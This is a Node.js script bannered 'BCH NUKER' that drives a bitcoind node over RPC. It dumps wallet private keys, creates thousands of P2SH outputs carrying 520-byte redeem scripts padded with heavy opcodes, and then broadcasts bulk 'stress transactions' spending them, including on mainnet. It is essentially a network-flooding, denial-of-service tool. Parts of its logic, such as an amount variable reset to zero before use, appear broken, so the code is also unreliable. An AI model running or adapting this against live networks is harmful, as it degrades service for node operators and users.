var bitcoincashjs = require('bitcoincashjs');
var bitcoind = require('bitcoind-rpc');
var Address = bitcoincashjs.Address;
var Hash = bitcoincashjs.crypto.Hash;
var Network = bitcoincashjs.Networks;
var Output = bitcoincashjs.Output;
var Script = bitcoincashjs.Script;
var readline = require('readline');

bitcoincashjs.Transaction.FEE_PER_KB = 50000;
// Bitcoind configuration
// Mainnet port: 8332
// Testnet/Regtest port: 18332
var config = {
  protocol: 'http',
  user: 'user',
  pass: 'passasdasdsa123',
  host: '127.0.0.1', // 127.0.0.1
  port: '18332', // 18332
};

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
var rpc = new bitcoind(config);
var txids = [];

function generateBlocks(num, callback) {
  console.log('Generating ' + num + ' block(s)... ');
  rpc.generate([num], function (err, ret) {
    if (err) {
      console.error(err);
      return;
    }
    if (callback) callback();
    return;
  });
}

function gatherUnspent(minConf, callback) {
  console.log('Gathering UTXOs... ');
  rpc.listUnspent([minConf], function (err, ret) {
    if (err) {
      console.error(err);
      return;
    }
    var tempUtxoArray = [];

    for (var i = 0; i < ret.result.length; i++) {
      if (ret.result[i].amount > 0.00000546) {
        var utxo = new bitcoincashjs.Transaction.UnspentOutput({
          "txid" : ret.result[i].txid,
          "vout" : ret.result[i].vout,
          "address" : Address.fromString(ret.result[i].address, networkParam, 'pubkeyhash', Address.CashAddrFormat),
          "scriptPubKey" : ret.result[i].scriptPubKey,
          "amount" : ret.result[i].amount
        });
        tempUtxoArray.push(utxo);
      }
    }
    console.log('Adding ' + tempUtxoArray.length + ' UTXOs...');
    utxoArray = tempUtxoArray;
    if (callback) callback();
    return;
  });
}

function getPrivateKeys(addresses, callback) {
  var privateKeyArray = [];

  function sendRequest(address, callback) {
    rpc.dumpPrivKey([address], function (err, ret) {
      if (err) {
        console.error(err);
        return;
      }
      privateKeyArray.push(ret.result);
      if (callback) return callback(privateKeyArray);
      return;
    });
  }

  var execute = async (address, callback, res) => {
    await sendRequest(address, callback, res);
  }

  for (var i = 0; i < addresses.length; i++) {
    execute(addresses[i], callback);
  }
}

function createRawTransaction(txParams, unsignedTx) {
  function sendRequest(params, unsignedTx) {
    rpc.createRawTransaction(params.inputs, params.address, function (err, ret) {
      if (err) {
        console.error(err);
        return;
      }
      unsignedTx.txhex = ret.result;
      return signRawTransactions(unsignedTx, sendRawTransaction);
    });
  }
  var execute = async (params, unsignedTx) => {
    await sendRequest(params, unsignedTx);
  }
  execute(txParams, unsignedTx);
}

function getBlockchainInfo(callback) {
  function sendRequest(callback) {
    rpc.getBlockchainInfo(function (err, ret) {
      if (err) {
        console.error(err);
        return;
      }
      network = ret.result.chain;
      if (network === 'regtest') networkParam = 'testnet';
      else if (network === 'testnet') networkParam = 'testnet';
      else networkParam = 'livenet';

      if (network === 'regtest') Network.enableRegtest();
      if (callback) return callback(ret.result.chain);
      return ret.result.chain;
    });
  }
  var execute = async (callback) => {
    await sendRequest(callback);
  }
  execute(callback);
}

function signRawTransactions(unsignedTx, callback) {
  function sendRequest(unsignedTx) {
    var amount = unsignedTx.amount;
    rpc.signRawTransaction(unsignedTx.txhex,
        [{"txid": unsignedTx.txid, "vout": unsignedTx.vout, "scriptPubKey": unsignedTx.scriptPubKey,
          "redeemScript": unsignedTx.redeemScript, "amount": amount}], [unsignedTx.privateKey],
            function (err, ret) {
      if (err) {
        console.error(err);
        return;
      }
      if (callback) return callback(ret.result.hex);
      return ret.result.hex;
    });
  }
  var execute = async (unsignedTx) => {
    await sendRequest(unsignedTx);
  }
  if (typeof unsignedTx !== 'undefined') execute(unsignedTx);
  else {
    for (var i = 0; i < unsignedTxArray.length; i++) {
      execute(unsignedTxArray[i]);
    }
  }
}

function sendRawTransaction(tx, callback) {
  function sendRequest(obj) {
    rpc.sendRawTransaction(obj, true, function (err, ret) {
      if (err) {
        console.error(err);
        return;
      }
      console.log('Stress tx sent:', ret.result);
      if (callback) return callback(ret.result);
      return ret.result;
    });
  }
  var execute = async (obj) => {
    await sendRequest(obj);
  }
  if (typeof tx !== 'undefined') {
    execute(tx);
  }
  else {
    for (var i = 0; i < txArray.length; i++) {
      execute(txArray[i].tx.toString());
      sentTxArray.push(txArray[i]);
    }
  }
}

function sendQueuedTransactions(callback) {
  function sendRequest(obj) {
    rpc.sendRawTransaction([obj.tx.toString()], function (err, ret) {
      if (err) {
        console.error(err);
        return;
      }
      if (callback) return callback(ret.result);
      return ret.result;
    });
  }
  var execute = async (obj) => {
    await sendRequest(obj);
  }
  for (var i = 0; i < txArray.length; i++) {
    execute(txArray[i]);
    sentTxArray.push(txArray[i]);
  }
}

function broadcastTransactions(callback) {
  // Broadcast transactions
  console.log('Broadcasting ' + txArray.length + ' transactions...');
    sendQueuedTransactions();
  if (callback) return callback();
}

function promisePrivateKey(tempUtxos, privateKey) {
  var addresses = [];
  var privateKeys = [];
  return new Promise(function(resolve, reject) {
    for (var i = 0; i < tempUtxos.length; i++) {
      addresses.push(tempUtxos[i].address.toString(Address.CashAddrFormat));
    }
    privateKeys = getPrivateKeys(addresses, resolve);
  })
  .then(function(privateKeys) {
    var tempKeyPair = keyPairArray[0];

    // Create 520 byte redeem script
    var redeemScript = Script();
    for (var i = 0; i < 82; i++) {
      redeemScript.add(new Buffer('fe7f', 'hex'))
      redeemScript.add('OP_4')
      redeemScript.add(0x80)
      redeemScript.add('OP_DROP')
    }
    redeemScript.add('OP_NOP')
    redeemScript.add('OP_1')
    redeemScript.add('OP_DROP')
    redeemScript.add('OP_1');

    // Create scriptSig for input
    var scriptSig = Script()
      .add('OP_5')
      .add('OP_ADD')
      .add('OP_6')
      .add('OP_EQUAL');

    // Create script hash and output address
    var scriptHash = Script.buildScriptHashOut(redeemScript);
    var outAddress = scriptHash.toAddress(networkParam);

    // Create P2SH transactions with OP_NUM2BIN
    var amount = 0;
    for (var i = 0; i < tempUtxos.length; i++) {
      amount += tempUtxos[i].satoshis;
    }
    amount = amount * 0.98; // pre-allocate 2% for fees
    var transaction = new bitcoincashjs.Transaction()
      .from(tempUtxos)
      .change(tempUtxos[0].address)
    for (var i = 0; i < 999; i++) { // 1000 outputs
      transaction.to(outAddress, Math.floor(amount/1000));
    }
    transaction.to(outAddress, Math.floor(amount/1000));
    transaction.fee(transaction.getFee());
    transaction.sign(privateKeys);
    txArray.push({tx: transaction, redeemScript: redeemScript, keyPair: tempKeyPair});
  });
}

function generateTransactions(callback) {
  // Generating transactions
  console.log('Generating transactions...');
  var makeTransaction = async () => {
    var tempUtxoArray = [];
    for (var i = 0; i < p2shUtxos / 1000; i++) {
      var privateKey;
      var tempSatoshis = 0;
      tempUtxoArray[i] = [];
      do {
        if (utxoArray.length === 0) {
          console.log('Warning: not enough UTXOs to generate transactions');
          process.exit(1);
        }
        var tempUtxo = utxoArray.pop();
        tempUtxoArray[i].push(tempUtxo);
        tempSatoshis += tempUtxo.satoshis;
      } while (tempSatoshis < 100000); // 0.001 btc
    }
    for (var i = 0; i < tempUtxoArray.length; i++) {
      await promisePrivateKey(tempUtxoArray[i], privateKey);
    };
  };
  makeTransaction().then(() => {
    if (callback) return callback();
    return;
  });
}

console.log(`
██████╗  ██████╗██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗
██╔══██╗██╔════╝██║  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     ███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██╔══██╗██║     ██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝╚██████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
`);

console.log(`                      █████████
  ███████          ███▒▒▒▒▒▒▒▒███
  █▒▒▒▒▒▒█       ███▒▒▒▒▒▒▒▒▒▒▒▒▒███
   █▒▒▒▒▒▒█    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
    █▒▒▒▒▒█   ██▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒▒███
     █▒▒▒█   █▒▒▒▒▒▒████▒▒▒▒████▒▒▒▒▒▒██
   █████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
   █▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒██
 ██▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒██▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██
██▒▒▒███████████▒▒▒▒▒██▒▒▒▒▒▒▒▒██▒▒▒▒▒██
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒████████▒▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
 █▒▒▒███████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
 ██▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
  ████████████   █████████████████`);
console.log('Press ctrl-c at any time to exit my bro\n');

// Initialize
var p2shTxs;
var p2shUtxos;
var keyPairArray = [];
var network;
var networkParam;
var outKeyPairArray = [];
var sentTxArray = [];
var signedTxArray = [];
var txArray = [];
var txParamsArray = [];
var unsignedTxArray = [];
var unsignedTxArray2 = [];
var utxoArray = [];

function asyncRun() {
  new Promise(mainResolve => {
    new Promise(res => {
      getBlockchainInfo(res);
    })
    .then(function() {
      if (network === 'regtest') {
        return new Promise(res => {
          rl.question('Regtest detected: How many blocks are we generating? (default 500): ', function(input) {
            if (!(parseInt(input))) {
              console.log('Failed to parse input');
              process.exit(1);
            }
            blocks = parseInt(input);
            generateBlocks(blocks, res);
          });
        })
      }
    })
    .then(function() {
      return new Promise(res => {
        gatherUnspent(1, res);
      });
    })
    .then(function() {
      return new Promise(res => {
        rl.question('How many P2SH UTXOs are we generating mate (input x 1000)? : ', function(input) {
          if (!(parseInt(input))) {
            console.log('Failed to parse input');
            process.exit(1);
          }
          p2shUtxos = parseInt(input) * 1000;
          res();
        });
      })
    })
    .then(function() {
      // Generate new keypairs
      console.log('Generating keypairs for P2SH addresses...');
      for (var i = 0; i < p2shUtxos; i++) {
        var privateP2shKey = new bitcoincashjs.PrivateKey(networkParam);
        var publicP2shKey = privateP2shKey.toPublicKey(networkParam);
        keyPairArray.push({privateKey: privateP2shKey, publicKey: publicP2shKey});
      }
      return;
    })
    .then(function() {
      return new Promise(res => {
        generateTransactions(res);
      })
    })
    .then(function() {
      return new Promise(res => {
        broadcastTransactions(res);
      });
    })
    .then(function() {
      return new Promise(res => {
        // Generate block or wait
        if (network === 'regtest') {
          generateBlocks(p2shUtxos/1000, res);
        }
        else {
          console.log('You should wait for transactions to confirm prior to continuing.');
        }
      })
    })
    .then(function() {
      return new Promise(res => {
        rl.question('How many P2SH inputs should we include per transaction (default 25)?: ', function(input) {
          if (!(parseInt(input)) || parseInt(input) > p2shUtxos) {
            console.log('Failed to parse input (are you sure we have enough P2SH UTXOs generated?)');
            process.exit(1);
          }
          p2shTxs = parseInt(input);
          res();
        });
      })
    })
    .then(function() {
      return new Promise(res => {
        res(mainResolve);
      })
    })
    .then(function() {
      return new Promise(res => {
        var inputLength = p2shTxs;
        var inputTicker = 0;
        var sentArray = [];
        var ticker = 0;
        var unsignedP2shTxArray = [];

        // Grab relayed P2SH output and redeem script
        for (var i = 0; i < sentTxArray.length; i++) {
          var sentTx = sentTxArray[i].tx;
          var sentRedeemScript = sentTxArray[i].redeemScript;
          var sentKeyPair = sentTxArray[i].keyPair;
          sentArray.push({sentTx: sentTx, sentRedeemScript: sentRedeemScript, sentKeyPair: sentKeyPair});
        }

        // Build UTXO set to redeem P2SH transaction
        for (var i = 0; i < sentArray.length; i++) {
          var unsignedP2shUtxo = {
            "txid": sentArray[i].sentTx.toObject().hash,
            "vout": 0,
            "scriptPubKey": sentArray[i].sentTx.toObject().outputs[0].script,
            "redeemScript": sentArray[i].sentRedeemScript.toHex(),
            "amount": sentArray[i].sentTx.toObject().outputs[0].satoshis / 100000000,
            "privateKey": sentArray[i].sentKeyPair.privateKey.toWIF(networkParam),
          };
          txAmount += unsignedP2shUtxo.amount;
          unsignedP2shTxArray.push(unsignedP2shUtxo);
        }

        // Loop for generating and broadcasting stress transactions
        console.log('Generating ' + Math.ceil(p2shUtxos/p2shTxs) + ' stress transactions...');
        for (var x = 0; x < Math.ceil(p2shUtxos/p2shTxs); x++) {
          var txAmount = 0;
          var address = utxoArray[0].address; // same address
          var feeMultiplier;
          if (txAmount > 100) feeMultiplier = 0.98; // 2%
          else if (txAmount > 1) feeMultiplier = 0.96; // 4%
          else feeMultiplier = 0.94; // 6%

          // Params for createRawTransaction()
          if (x === Math.ceil(p2shUtxos/(p2shTxs)) - 1) inputLength = (p2shUtxos - (x * p2shTxs));
          var rawTxParams = {};
          rawTxParams["inputs"] = [];

          for (i = 0; i < inputLength; i++) {
            var addInput = {
              "txid": unsignedP2shTxArray[ticker].txid,
              "vout": inputTicker
            };
            rawTxParams["inputs"].push(addInput);
            inputTicker++;
            if (inputTicker > 1000) {
              inputTicker = 0;
              ticker++;
            }
          }
          rawTxParams["address"] = {};
          var tempAddrObject = {};
          var outputAmount  = (txAmount * feeMultiplier).toFixed(8);
          rawTxParams["address"][address] = outputAmount;
          var txHex = createRawTransaction(rawTxParams, unsignedP2shTxArray[0]);
        }
      });
    })
  });
}
asyncRun();